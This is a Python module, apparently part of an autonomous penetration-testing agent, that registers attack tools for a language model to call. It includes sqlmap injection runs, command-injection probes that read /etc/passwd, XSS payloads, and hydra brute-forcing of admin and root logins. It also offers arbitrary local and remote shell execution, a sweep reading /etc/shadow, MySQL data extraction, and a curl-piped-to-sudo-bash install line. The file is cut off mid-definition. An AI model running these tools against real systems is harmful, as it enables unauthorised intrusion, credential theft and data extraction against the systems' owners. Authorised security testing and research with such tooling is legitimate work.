"""Attack tools — exploitation, injection testing, payload delivery.

Reference: AWE xss_agent, sqli_agent — exploitation patterns
           VulnBot roles/scanner.py, roles/exploiter.py — tool list
"""

from __future__ import annotations

import asyncio
import re
import time
from pathlib import Path
from typing import Any, Dict

from darwin.tools.mcp_gateway import MCPGateway, ToolResult


def _parse_hydra_output(stdout: str) -> Dict[str, Any]:
    """Parse hydra output for discovered credentials."""
    credentials = []
    for line in stdout.split("\n"):
        match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
        if match:
            credentials.append({"username": match.group(1), "password": match.group(2)})
        # Alternative format: host: ... login: ... password: ...
        match2 = re.search(r"\[(\d+)\]\[(\w+)\]\s+host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(\S+)", line)
        if match2:
            credentials.append({"service": match2.group(2), "username": match2.group(3), "password": match2.group(4)})
    return {"credentials": credentials, "count": len(credentials)}


def _parse_searchsploit_output(stdout: str) -> Dict[str, Any]:
    """Parse searchsploit results for exploits."""
    exploits = []
    for line in stdout.split("\n"):
        # Format: Title | Path
        parts = line.split(" | ")
        if len(parts) >= 2:
            exploits.append({
                "title": parts[0].strip(),
                "path": parts[1].strip(),
            })
    return {"exploits": exploits, "count": len(exploits)}


def _parse_shell_output(stdout: str) -> Dict[str, Any]:
    """Parse generic shell command output — return first 2000 chars as output."""
    return {"output": stdout[:2000], "length": len(stdout)}


def _parse_smbmap_output(stdout: str) -> Dict[str, Any]:
    """Parse smbmap output for SMB shares and permissions."""
    shares = []
    for line in stdout.split("\n"):
        line = line.strip()
        if not line or "IP：" in line or "SMBMap" in line:
            continue
        match = re.match(r"\s*(\S+)\s+(\S+)\s+(\S+)", line)
        if match:
            shares.append({
                "share": match.group(1),
                "permissions": match.group(2),
                "comment": match.group(3) if match.group(3) != "NO" else "",
            })
    return {"shares": shares, "count": len(shares)}


async def _run_shell(cmd: str, timeout: int = 60) -> ToolResult:
    """Execute a shell command with timeout."""
    import asyncio
    start = time.perf_counter()
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        elapsed = (time.perf_counter() - start) * 1000
        return ToolResult(
            tool_name="shell_exec",
            success=proc.returncode == 0,
            stdout=stdout.decode("utf-8", errors="replace"),
            stderr=stderr.decode("utf-8", errors="replace"),
            exit_code=proc.returncode or 0,
            elapsed_ms=elapsed,
        )
    except asyncio.TimeoutError:
        elapsed = (time.perf_counter() - start) * 1000
        return ToolResult(
            tool_name="shell_exec",
            success=False,
            stdout="",
            stderr=f"Timeout after {timeout}s",
            exit_code=-1,
            elapsed_ms=elapsed,
        )


async def _python_request(
    method: str, url: str, data: str = "", headers: str = "",
    timeout: int = 10, insecure: bool = False,
) -> ToolResult:
    """Execute a HTTP request via Python (for complex payloads).

    Uses a temp file to avoid shell escaping issues with special characters
    in URLs and payloads (e.g. single quotes in SQLi).
    """
    import asyncio
    import json
    import tempfile
    import os as _os

    ctx_setup = ""
    if insecure:
        ctx_setup = """
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
"""
    else:
        ctx_setup = "ctx = None"

    script = f"""
import urllib.request, json
{ctx_setup}
url = {json.dumps(url)}
method = {json.dumps(method)}
data = {json.dumps(data)}
headers = {json.dumps(headers)}

req = urllib.request.Request(url, method=method, data=data.encode() if data else None)
if data and method in ('POST', 'PUT', 'PATCH') and 'content-type' not in headers.lower():
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
if headers:
    for h in headers.strip().split('\\\\n'):
        if ':' in h:
            k, v = h.split(':', 1)
            req.add_header(k.strip(), v.strip())

try:
    kwargs = {{"timeout": {timeout}}}
    if ctx is not None:
        kwargs["context"] = ctx
    with urllib.request.urlopen(req, **kwargs) as resp:
        body = resp.read().decode('utf-8', errors='replace')
        print(f"STATUS:{{resp.status}}")
        for k, v in resp.getheaders():
            print(f"HEADER:{{k}}:{{v}}")
        print("BODY_START")
        print(body[:10000])
except Exception as e:
    print(f"ERROR:{{e}}")
"""
    # Write to temp file to avoid shell escaping issues
    fd, tmpath = tempfile.mkstemp(suffix=".py", prefix="darwin_req_")
    try:
        _os.write(fd, script.encode("utf-8"))
        _os.close(fd)
        cmd = f"python3 {tmpath}"
        result = await _run_shell(cmd, timeout=timeout + 5)
    finally:
        try:
            _os.unlink(tmpath)
        except OSError:
            pass
    return result


def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
    """Register all attack/exploitation tools.

    Reference: AWE exploitation agents + VulnBot scanner/exploiter tools
    """

    # ── SQL injection test ──────────────────────────────────────
    async def sqlmap_test(url: str, param: str, technique: str = "BEUSTQ",
                         method: str = "GET", body_format: str = "form",
                         content_type: str = "") -> ToolResult:
        """Run sqlmap against a target parameter.

        Args:
            url: Target URL
            param: Parameter name to test
            technique: SQLi techniques (BEUSTQ)
            method: HTTP method (GET/POST)
            body_format: For POST: "form" (urlencoded) or "json" (JSON body)
            content_type: Custom Content-Type header (overrides body_format)
        """
        # Level 2, risk 1 for speed
        base_cmd = (f"sqlmap -u '{url}' --technique={technique} --batch "
                     f"--level=2 --risk=1 --flush-session --smart "
                     f"--threads=4 --output-dir=/tmp/sqlmap")
        if method.upper() == "POST":
            if body_format == "json":
                # JSON body: {"param":"*"} — sqlmap's injection marker
                ct = content_type or "application/json"
                data_str = f'{{"{param}":"*"}}'
                cmd = f"{base_cmd} --data='{data_str}' --headers='Content-Type: {ct}' 2>&1"
            else:
                # Form-urlencoded (default)
                ct = content_type or "application/x-www-form-urlencoded"
                if ct != "application/x-www-form-urlencoded":
                    cmd = f"{base_cmd} --data='{param}=*' --headers='Content-Type: {ct}' 2>&1"
                else:
                    cmd = f"{base_cmd} --data='{param}=*' 2>&1"
        else:
            cmd = f"{base_cmd} -p {param} 2>&1"
        return await _run_shell(cmd, timeout=25)

    gateway.register(
        name="sqlmap_test",
        func=sqlmap_test,
        description="Test for SQL injection vulnerability using sqlmap. For JSON APIs, set body_format='json'.",
        parameters={
            "url": {"type": "string", "description": "Target URL with parameters"},
            "param": {"type": "string", "description": "Parameter to test for injection"},
            "technique": {"type": "string", "description": "SQLi techniques: B(E)oolean, E(rror), U(nion), S(tacked), T(ime), Q(uery)"},
            "method": {"type": "string", "description": "HTTP method (GET/POST)"},
            "body_format": {"type": "string", "description": "For POST: 'form' (urlencoded) or 'json' (JSON body)"},
            "content_type": {"type": "string", "description": "Custom Content-Type header value"},
        },
    )

    # ── Web fuzzing (ffuf) ──────────────────────────────────────
    gateway.register_shell_tool(
        name="ffuf_fuzz",
        command_template="ffuf -u '{url}' -w /usr/share/dirb/wordlists/common.txt -mc 200,301,302,403 -o /dev/null 2>&1 | head -100",
        description="Fuzz web parameters or paths using ffuf",
        parameters={
            "url": {"type": "string", "description": "Target URL with FUZZ keyword"},
        },
    )

    # ── HTTP request with custom payload ────────────────────────
    async def send_payload(
        url: str, param: str, payload: str, method: str = "GET",
        encode_type: str = "none", body_format: str = "form",
        insecure: bool = False,
    ) -> ToolResult:
        """Send a custom payload to a target. Supports GET query string and
        POST with form-encoded or JSON body."""
        import urllib.parse, json

        # Apply encoding
        encoded_payload = payload
        if encode_type == "url":
            encoded_payload = urllib.parse.quote(payload)
        elif encode_type == "double_url":
            encoded_payload = urllib.parse.quote(urllib.parse.quote(payload))
        elif encode_type == "html_entity":
            encoded_payload = "".join(f"&#{ord(c)};" for c in payload)

        if method.upper() == "GET":
            separator = "&" if "?" in url else "?"
            full_url = f"{url}{separator}{param}={encoded_payload}"
            return await _python_request("GET", full_url, insecure=insecure)
        elif body_format == "json":
            import json as _js
            # If payload looks like complete JSON, use it directly.
            # Otherwise wrap as {param: payload}.
            stripped = encoded_payload.strip()
            if stripped.startswith("{") or stripped.startswith("["):
                try:
                    _js.loads(stripped)
                    body = stripped  # payload is already valid JSON
                except (ValueError, _js.JSONDecodeError):
                    body = _js.dumps({param or "payload": encoded_payload})
            else:
                body = _js.dumps({param or "payload": encoded_payload})
            return await _python_request(
                "POST", url, body,
                headers="Content-Type: application/json",
                insecure=insecure,
            )
        else:
            return await _python_request("POST", url, f"{param}={encoded_payload}",
                                        insecure=insecure)

    gateway.register(
        name="send_payload",
        func=send_payload,
        description="Send an exploitation payload to a target. Supports GET/POST with form or JSON body. Use insecure=true for self-signed TLS.",
        parameters={
            "url": {"type": "string", "description": "Target URL"},
            "param": {"type": "string", "description": "Parameter name to inject"},
            "payload": {"type": "string", "description": "Payload string to send"},
            "method": {"type": "string", "description": "HTTP method (GET/POST)"},
            "encode_type": {"type": "string", "description": "Encoding: none|url|double_url|html_entity"},
            "body_format": {"type": "string", "description": "POST body format: form or json (default form)"},
            "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
        },
    )

    # ── Command injection test ──────────────────────────────────
    async def command_injection_test(url: str, param: str,
                                      insecure: bool = False) -> ToolResult:
        """Test for command injection vulnerability with broad payload coverage."""
        import urllib.request
        import urllib.parse
        import ssl
        from urllib.parse import quote

        ctx = None
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        probes: list[tuple[str, str, str]] = [
            # (payload, encode_type, label)
            (";id", "raw", "semicolon"),
            ("|id", "raw", "pipe"),
            ("`id`", "raw", "backtick"),
            ("$(id)", "raw", "dollar_subshell"),
            (";cat /etc/passwd", "raw", "semicolon_passwd"),
            ("|cat /etc/passwd", "raw", "pipe_passwd"),
            ("%0aid", "none", "url_newline"),
            ("%0d%0aid", "none", "url_crlf"),
            ("||id", "raw", "or_cmd"),
            ("&&id", "raw", "and_cmd"),
            (";whoami", "raw", "semicolon_whoami"),
            ("|whoami", "raw", "pipe_whoami"),
            ("$(cat /etc/passwd)", "raw", "subshell_passwd"),
        ]

        EVIDENCE_PATTERNS = [
            # Only patterns that would NOT appear in normal application output
            ("uid=", "Unix user info from id command"),
            ("gid=", "Unix group info from id command"),
            ("groups=", "id groups output"),
            ("root:x:", "passwd file root entry"),
            ("bin:x:", "passwd system user"),
            ("daemon:x:", "passwd daemon user"),
            ("/bin/bash", "shell path in passwd"),
            ("nobody:x:", "passwd nobody user"),
        ]

        results = []
        all_responses: dict[str, str] = {}
        found_evidence = False

        for probe_cmd, encode_type, label in probes:
            if encode_type == "none":
                # Already URL-encoded, append raw
                joiner = "&" if "?" in url else "?"
                probe_url = f"{url}{joiner}{param}={probe_cmd}"
            else:
                joiner = "&" if "?" in url else "?"
                encoded = urllib.parse.quote(probe_cmd, safe="")
                probe_url = f"{url}{joiner}{param}={encoded}"

            try:
                req = urllib.request.Request(probe_url)
                kwargs = {"timeout": 10}
                if ctx is not None:
                    kwargs["context"] = ctx
                with urllib.request.urlopen(req, **kwargs) as resp:
                    body = resp.read().decode("utf-8", errors="replace")
                    body_lower = body.lower()
                    all_responses[label] = body[:300]

                    matched = []
                    for pattern, desc in EVIDENCE_PATTERNS:
                        if pattern.lower() in body_lower:
                            matched.append(f"{pattern} ({desc})")

                    if matched:
                        found_evidence = True
                        results.append(
                            f"{label}: EXECUTED — evidence: {', '.join(matched[:3])}"
                        )
                    elif body.strip():
                        results.append(
                            f"{label}: no evidence (response: {body[:120].strip()})"
                        )
                    else:
                        results.append(f"{label}: no evidence (empty response)")
            except Exception as e:
                results.append(f"{label}: error - {str(e)[:100]}")

        # If nothing executed but all got responses, include the most distinctive
        # response sample to help the LLM understand what the app returns
        if not found_evidence and all_responses:
            # Detect static endpoints: all probes return identical response
            unique_bodies = set(all_responses.values())
            if len(unique_bodies) == 1:
                static_body = list(unique_bodies)[0]
                results.append(
                    f"STATIC ENDPOINT: All {len(probes)} probes returned the SAME response "
                    f"({static_body[:120]}). This endpoint does NOT execute the input — "
                    f"it returns static content regardless of the parameter value. "
                    f"Do NOT waste time on manual command injection follow-up."
                )
            else:
                # Varied responses — show samples so LLM can analyze
                samples = []
                for label, body in list(all_responses.items())[:3]:
                    samples.append(f"  [{label}] {body[:150]}")
                results.append(
                    f"All {len(probes)} probes returned responses without evidence. "
                    f"{len(unique_bodies)} unique response(s). Samples:\n" + "\n".join(samples)
                )

        return ToolResult(
            tool_name="command_injection_test",
            success=True,
            stdout="\n".join(results),
            stderr="",
            exit_code=0,
            elapsed_ms=0,
        )

    gateway.register(
        name="command_injection_test",
        func=command_injection_test,
        description="Test for command injection using multiple probe techniques",
        parameters={
            "url": {"type": "string", "description": "Target URL"},
            "param": {"type": "string", "description": "Parameter to test"},
            "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
        },
    )

    # ── XSS reflection test ─────────────────────────────────────
    async def xss_reflection_test(url: str, param: str,
                                   method: str = "GET",
                                   insecure: bool = False) -> ToolResult:
        """Test for XSS by checking payload reflection. Auto-retries POST on 405."""
        import urllib.request, urllib.parse, json, urllib.error, ssl

        ctx = None
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        method = method.upper()
        probes = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
        results = []

        for probe in probes:
            actual_method = method
            try:
                if actual_method == "POST":
                    data = json.dumps({param: probe}).encode()
                    req = urllib.request.Request(
                        url, data=data, method="POST",
                        headers={"Content-Type": "application/json"},
                    )
                else:
                    qs = urllib.parse.quote(probe)
                    sep = "&" if "?" in url else "?"
                    req = urllib.request.Request(f"{url}{sep}{param}={qs}")

                try:
                    kwargs = {"timeout": 10}
                    if ctx is not None:
                        kwargs["context"] = ctx
                    with urllib.request.urlopen(req, **kwargs) as resp:
                        body = resp.read().decode("utf-8", errors="replace")
                except urllib.error.HTTPError as e:
                    if e.code == 405 and method == "GET":
                        # POST-only endpoint — retry once with POST
                        data = json.dumps({param: probe}).encode()
                        req2 = urllib.request.Request(
                            url, data=data, method="POST",
                            headers={"Content-Type": "application/json"},
                        )
                        kwargs2 = {"timeout": 10}
                        if ctx is not None:
                            kwargs2["context"] = ctx
                        with urllib.request.urlopen(req2, **kwargs2) as resp2:
                            body = resp2.read().decode("utf-8", errors="replace")
                        actual_method = "POST"
                        results.append("[auto-switched to POST]")
                    else:
                        raise

                # Check reflection
                if probe in body:
                    results.append(f"REFLECTED: {probe[:40]}... (intact)")
                elif urllib.parse.unquote(probe) in body:
                    results.append(f"REFLECTED: {probe[:40]}... (decoded)")
                else:
                    for keyword in ["<script>", "alert", "onerror"]:
                        if keyword in body:
                            results.append(f"PARTIAL: {probe[:40]}... ({keyword} found)")
                            break
                    else:
                        results.append(f"BLOCKED: {probe[:40]}... (not found)")
            except Exception as e:
                results.append(f"ERROR: {probe[:40]}... - {e}")

        return ToolResult(
            tool_name="xss_reflection_test",
            success=True,
            stdout="\n".join(results),
            stderr="",
            exit_code=0,
            elapsed_ms=0,
        )

    gateway.register(
        name="xss_reflection_test",
        func=xss_reflection_test,
        description="Test for XSS by sending GET/POST payloads and checking reflection",
        parameters={
            "url": {"type": "string", "description": "Target URL"},
            "param": {"type": "string", "description": "Parameter to test for XSS"},
            "method": {"type": "string", "description": "HTTP method (GET or POST, default GET)"},
            "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
        },
    )

    # ── Hydra: Brute force ───────────────────────────────────────
    async def hydra_http_brute(
        url: str, userlist: str = "/usr/share/dirb/wordlists/common.txt",
        passlist: str = "/usr/share/dirb/wordlists/common.txt",
    ) -> ToolResult:
        """Brute force HTTP POST login form."""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        cmd = (
            f"hydra -l admin -P {passlist} "
            f"{parsed.hostname} "
            f"http-post-form '{parsed.path or '/'}:"
            f"user=^USER^&pass=^PASS^:"
            f"F=incorrect|F=invalid|F=failed' "
            f"-t 4 -f 2>&1 | head -50"
        )
        return await _run_shell(cmd, timeout=120)

    gateway.register(
        name="hydra_http_brute",
        func=hydra_http_brute,
        description="Brute force HTTP login form with common password using hydra",
        parameters={
            "url": {"type": "string", "description": "Target login URL"},
            "userlist": {"type": "string", "description": "Path to username wordlist"},
            "passlist": {"type": "string", "description": "Path to password wordlist"},
        },
    )

    gateway.register_shell_tool(
        name="hydra_ssh_brute",
        command_template="hydra -l root -P /usr/share/dirb/wordlists/common.txt ssh://{target} -t 4 -f 2>&1 | head -50",
        description="Brute force SSH login with common passwords using hydra",
        parameters={
            "target": {"type": "string", "description": "Target hostname or IP"},
        },
        parser=_parse_hydra_output,
        timeout=120,
    )

    gateway.register_shell_tool(
        name="ssh_exec",
        command_template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {username}@{host} '{command}' 2>&1",
        description="Execute a command on a remote host via SSH (requires username + password). Use for Linux privilege escalation checks (sudo -l, uname -a, id), file listing, flag hunting, and post-exploitation.",
        parameters={
            "host": {"type": "string", "description": "SSH target hostname or IP"},
            "username": {"type": "string", "description": "SSH username"},
            "password": {"type": "string", "description": "SSH password"},
            "command": {"type": "string", "description": "Command to execute on the remote host"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    gateway.register_shell_tool(
        name="shell_exec",
        command_template="{command} 2>&1",
        description="Execute an arbitrary shell command locally. Use for: SSH key generation (ssh-keygen), compiling kernel exploits (gcc), running Python/Perl scripts, file operations, and any task not covered by specialized tools.",
        parameters={
            "command": {"type": "string", "description": "Full shell command to execute locally"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )

    gateway.register_shell_tool(
        name="ssh_key_exec",
        command_template="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o PasswordAuthentication=no -o BatchMode=yes -p {port} -i {key_path} {user}@{host} '{command}' 2>&1",
        description="Execute a command on a remote host using SSH key authentication (no password needed). Always specify port — default SSH port is 22, but many targets use non-standard ports.",
        parameters={
            "key_path": {"type": "string", "description": "Path to SSH private key file"},
            "user": {"type": "string", "description": "SSH username"},
            "host": {"type": "string", "description": "Target host IP or hostname"},
            "port": {"type": "integer", "description": "SSH port (e.g. 10222)", "default": 22},
            "command": {"type": "string", "description": "Command to execute on the remote host"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="test_credential",
        command_template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p {port} {user}@{host} '{command}' 2>&1",
        description="Test if a username/password combination works on a remote host via SSH. Returns user info if successful. Always specify port — non-standard ports are common.",
        parameters={
            "user": {"type": "string", "description": "Username to test"},
            "password": {"type": "string", "description": "Password to test"},
            "host": {"type": "string", "description": "Target host IP or hostname"},
            "port": {"type": "integer", "description": "SSH port (e.g. 10222)", "default": 22},
            "command": {"type": "string", "description": "Command to execute if login succeeds (default: id)", "default": "id"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── Linux Privilege Escalation Tools ──────────────────────────

    gateway.register_shell_tool(
        name="linux_priv_check",
        command_template="echo '=== USER ===' && id && echo '=== KERNEL ===' && uname -a && echo '=== SUDO ===' && sudo -ln 2>/dev/null || echo '(no sudo)' && echo '=== SUID ===' && find / -perm -4000 -type f 2>/dev/null | head -20 && echo '=== CAPS ===' && capsh --print 2>/dev/null || cat /proc/1/status 2>/dev/null | grep -i cap || echo '(no capsh)' && echo '=== CRON ===' && ls -la /etc/cron* 2>/dev/null || echo '(no cron)' && echo '=== PASSWD ===' && cat /etc/passwd 2>/dev/null | head -20 && echo '=== SHADOW ===' && cat /etc/shadow 2>/dev/null | head -5 || echo '(no shadow read)'",
        description="Comprehensive LOCAL Linux privilege escalation check. Runs: id, uname -a, sudo -l, SUID binary search, capabilities, cron jobs, user/password enumeration. For REMOTE targets, use ssh_exec with individual commands instead.",
        parameters={},
        parser=_parse_shell_output,
        timeout=60,
    )

    # ── SearchSploit: Exploit-DB search ───────────────────────────
    gateway.register_shell_tool(
        name="searchsploit_search",
        command_template="searchsploit {query} 2>&1 | head -30",
        description="Search Exploit-DB for public exploits matching query (CVE, software name, etc.)",
        parameters={
            "query": {"type": "string", "description": "Search term: CVE ID, software name, or vulnerability type"},
        },
        parser=_parse_searchsploit_output,
        timeout=30,
    )

    # ── SMBMap: SMB enumeration ──────────────────────────────────
    gateway.register_shell_tool(
        name="smbmap_enum",
        command_template="smbmap -H {target} 2>&1",
        description="Enumerate SMB shares and their permissions on a target host",
        parameters={
            "target": {"type": "string", "description": "Target IP or hostname"},
        },
        parser=_parse_smbmap_output,
        timeout=60,
    )

    # ── Knowledge search (DarwinRAG + keyword fallback) ──────────
    async def knowledge_search(query: str, category: str = "") -> ToolResult:
        """Search penetration testing knowledge base for exploit patterns.

        Category filter is IGNORED for the primary search — it causes false
        negatives when knowledge entries use different category tags than the
        LLM expects. The LLM-provided category is only used if the initial
        unfiltered search returns >10 results, as a precision refinement pass.
        """
        try:
            from darwin.rag import get_rag
            rag = get_rag()
            # Always search WITHOUT category filter first
            results = rag.search(query, top_k=5, category="", min_keyword_overlap=0.2)
            # Only apply category filter if first pass is too noisy
            if len(results) > 10 and category:
                results = rag.search(query, top_k=5, category=category, min_keyword_overlap=0.2)

            if not results:
                try:
                    from darwin.knowledge_base import KnowledgeBase
                    kb = KnowledgeBase()
                    kb_entries = kb.search(query, category="", top_k=5)
                    if kb_entries:
                        output = "## Knowledge Base (keyword match)\n\n"
                        for i, e in enumerate(kb_entries, 1):
                            output += f"### {i}. {e.title} ({e.category}/{e.subcategory})"
                            if e.mitre_attack:
                                output += f" MITRE:{e.mitre_attack}"
                            output += f"\n{e.description}\n"
                            if e.techniques:
                                output += "**Techniques:**\n"
                                for t in e.techniques[:5]:
                                    output += f"  - {t}\n"
                            output += "\n"
                        return ToolResult(tool_name="knowledge_search", success=True,
                            stdout=output, stderr="", exit_code=0, elapsed_ms=0)
                except ImportError:
                    pass
                return ToolResult(tool_name="knowledge_search", success=True,
                    stdout="No matching knowledge patterns found.", stderr="", exit_code=0, elapsed_ms=0)

            output = "## Knowledge Base\n\n"
            for i, r in enumerate(results, 1):
                output += f"### {i}. {r['title']} (score:{r['score']:.3f}, {r.get('collection','')}/{r['category']})\n"
                output += f"{r['description']}\n"
                if r.get('techniques'):
                    output += "**Techniques:**\n"
                    for t in r.get('techniques', [])[:5]:
                        output += f"  - {t}\n"
                output += "\n"
            return ToolResult(tool_name="knowledge_search", success=True,
                stdout=output, stderr="", exit_code=0, elapsed_ms=0)
        except Exception as e:
            return ToolResult(tool_name="knowledge_search", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="knowledge_search",
        func=knowledge_search,
        description="Research tool — search the knowledge base for known vulnerabilities, exploitation techniques, and configuration weaknesses for a specific technology, service version, or vulnerability type. Call this BEFORE running exploit tools to identify the correct approach. Example queries: 'SQL injection MariaDB', 'JWT token bypass', 'Flask SSTI exploitation'",
        parameters={
            "query": {"type": "string", "description": "Natural language query (e.g. 'IDOR in FastAPI')"},
            "category": {"type": "string", "description": "Optional filter: IDOR, SQLI, AUTH, RECON"},
        },
    )

    # ── CVE Lookup: NIST NVD API ──────────────────────────────────
    async def cve_lookup(cve_id: str) -> ToolResult:
        """Look up CVE details from the NIST NVD API (free, no key required)."""
        import urllib.request as _ur, json as _json
        try:
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
            req = _ur.Request(url, headers={"User-Agent": "DARWIN/0.1"})
            with _ur.urlopen(req, timeout=15) as resp:
                data = _json.loads(resp.read())
            vulns = data.get("vulnerabilities", [])
            if not vulns:
                return ToolResult(tool_name="cve_lookup", success=True,
                    stdout=f"No CVE data found for {cve_id}", stderr="", exit_code=0, elapsed_ms=0)
            cve = vulns[0].get("cve", {})
            desc = cve.get("descriptions", [{}])[0].get("value", "")[:500]
            metrics = cve.get("metrics", {})
            cvss_v31 = metrics.get("cvssMetricV31", [{}])[0].get("cvssData", {})
            cvss_score = cvss_v31.get("baseScore", "N/A")
            cvss_severity = cvss_v31.get("baseSeverity", "N/A")
            vector = cvss_v31.get("vectorString", "")
            published = cve.get("published", "")
            modified = cve.get("lastModified", "")
            refs = [r.get("url", "") for r in cve.get("references", [])[:5]]
            output = (
                f"CVE: {cve_id}\n"
                f"CVSS v3.1: {cvss_score} ({cvss_severity})\n"
                f"Vector: {vector}\n"
                f"Published: {published}\n"
                f"Modified: {modified}\n"
                f"Description: {desc}\n"
                f"References:\n" + "\n".join(f"  - {r}" for r in refs)
            )
            return ToolResult(tool_name="cve_lookup", success=True, stdout=output,
                stderr="", exit_code=0, elapsed_ms=0,
                parsed_output={"cve_id": cve_id, "cvss_score": cvss_score,
                    "severity": cvss_severity, "description": desc[:200], "references": refs})
        except Exception as e:
            return ToolResult(tool_name="cve_lookup", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="cve_lookup",
        func=cve_lookup,
        description="Look up CVE details from NIST NVD: CVSS score, severity, description, affected versions, and references. Use to assess vulnerability severity and find patches.",
        parameters={
            "cve_id": {"type": "string", "description": "CVE ID (e.g. CVE-2021-44228, CVE-2023-12345)"},
        },
    )

    # ── Metasploit exploit search ──────────────────────────────────
    async def metasploit_search(query: str) -> ToolResult:
        """Search Metasploit Framework for available exploit modules."""
        import asyncio
        try:
            cmd = f"msfconsole -q -x 'search {query}; exit' 2>&1"
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
            output = stdout.decode("utf-8", errors="replace")
            err_output = stderr.decode("utf-8", errors="replace")
            # Check if msfconsole is not installed (shell returns "not found")
            if "not found" in output.lower() or "not found" in err_output.lower():
                return ToolResult(tool_name="metasploit_search", success=False,
                    stdout="msfconsole not installed. Install: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo bash msfinstall",
                    stderr="msfconsole not found on PATH", exit_code=127, elapsed_ms=0)
            if "Matching Modules" in output or "exploit/" in output:
                return ToolResult(tool_name="metasploit_search", success=True,
                    stdout=output[:5000], stderr=err_output,
                    exit_code=proc.returncode or 0, elapsed_ms=0)
            return ToolResult(tool_name="metasploit_search", success=False,
                stdout=output[:2000] or "No matching modules found",
                stderr=err_output, exit_code=proc.returncode or 0, elapsed_ms=0)
        except asyncio.TimeoutError:
            return ToolResult(tool_name="metasploit_search", success=False,
                stdout="msfconsole search timed out", stderr="", exit_code=1, elapsed_ms=0)
        except Exception as e:
            return ToolResult(tool_name="metasploit_search", success=False,
                stdout=f"msfconsole search failed: {e}", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="metasploit_search",
        func=metasploit_search,
        description="Search Metasploit Framework for available exploit modules, auxiliary scanners, and post-exploitation modules matching the query. Returns module name, rank, and description. Requires msfconsole installed.",
        parameters={
            "query": {"type": "string", "description": "Search term: software name, CVE ID, or vulnerability type (e.g. 'apache struts', 'CVE-2021-44228', 'samba')"},
        },
    )

    # ── go-exploitdb local search ──────────────────────────────────
    async def go_exploitdb_search(query: str, limit: int = 10) -> ToolResult:
        """Search local exploit databases for exploits matching a CVE or keyword.

        Tries go-exploitdb SQLite database first, falls back to searchsploit.
        """
        import sqlite3
        db_path = Path(__file__).parent.parent.parent / "go-exploitdb.sqlite3"
        if db_path.exists():
            try:
                conn = sqlite3.connect(str(db_path))
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT cve_id, description, url, exploit_type FROM exploits "
                    "WHERE cve_id LIKE ? OR description LIKE ? LIMIT ?",
                    (f"%{query}%", f"%{query}%", limit),
                )
                rows = cursor.fetchall()
                conn.close()
                if rows:
                    results = [f"CVE: {r[0]}\nDescription: {r[1]}\nURL: {r[2]}\nType: {r[3]}" for r in rows]
                    return ToolResult(tool_name="go_exploitdb_search", success=True,
                        stdout="\n---\n".join(results), stderr="",
                        exit_code=0, elapsed_ms=0)
            except Exception:
                pass

        # Fallback to searchsploit
        import asyncio
        cmd = f"searchsploit {query} 2>&1 | head -{limit + 5}"
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        stdout_str = stdout.decode("utf-8", errors="replace")
        if proc.returncode == 0 and stdout_str.strip():
            return ToolResult(tool_name="go_exploitdb_search", success=True,
                stdout=stdout_str[:3000], stderr="",
                exit_code=0, elapsed_ms=0)
        return ToolResult(tool_name="go_exploitdb_search", success=False,
            stdout="No exploits found. Try: go-exploitdb fetch --log-dir /tmp (to populate local DB)",
            stderr=stderr.decode("utf-8", errors="replace")[:500],
            exit_code=1, elapsed_ms=0)

    gateway.register(
        name="go_exploitdb_search",
        func=go_exploitdb_search,
        description="Search local go-exploitdb for public exploits matching a CVE ID or keyword. Returns exploit type, description, and references. Requires go-exploitdb database (fetch with: go-exploitdb fetch).",
        parameters={
            "query": {"type": "string", "description": "CVE ID or keyword to search for (e.g. 'CVE-2021-44228', 'Apache')"},
            "limit": {"type": "integer", "description": "Max results (default 10)"},
        },
    )

    # ── Database Client Tools ──────────────────────────────────────

    gateway.register_shell_tool(
        name="mysql_query",
        command_template="mysql -h {host} -P {port} -u {user} -p'{password}' -e '{query}' 2>&1",
        description="Execute a SQL query on a MySQL/MariaDB database. Use for data extraction, UDF privilege escalation checks, and reading files via LOAD_FILE().",
        parameters={
            "host": {"type": "string", "description": "MySQL host IP or hostname"},
            "port": {"type": "integer", "description": "MySQL port (default 3306)"},
            "user": {"type": "string", "description": "Database username"},
